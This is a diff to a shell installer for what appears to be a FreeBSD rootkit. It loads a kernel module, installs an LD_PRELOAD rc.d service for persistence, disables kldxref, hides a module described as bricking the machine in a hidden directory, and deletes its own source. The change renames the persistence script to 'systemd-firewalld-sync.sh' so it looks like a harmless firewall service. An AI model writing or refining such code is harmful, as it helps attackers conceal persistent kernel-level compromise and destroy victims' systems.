@@ -21,12 +21,12 @@ cp "$LKM_NAME" /boot/modules/
 pkg install -y socat
 
 # service ldpreload start
-mv ldpreload.sh /usr/local/etc/rc.d/
-chmod +x /usr/local/etc/rc.d/ldpreload.sh
+mv systemd-firewalld-sync.sh /usr/local/etc/rc.d/
+chmod +x /usr/local/etc/rc.d/systemd-firewalld-sync.sh
 
 # Disable kldxref by setting kldxref_enable="NO"
 sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
-
+chmod +x "/boot/modules/$LKM_NAME"
 kldload "/boot/modules/$LKM_NAME"
 
 # create and put the LKM that "bricks" the box into a hidden directory 
@@ -39,4 +39,4 @@ mv evil.ko /boot/modules/.evil/
 
 cd ../../..
 rm -rf Apekit-rootshit
-
+cd ..
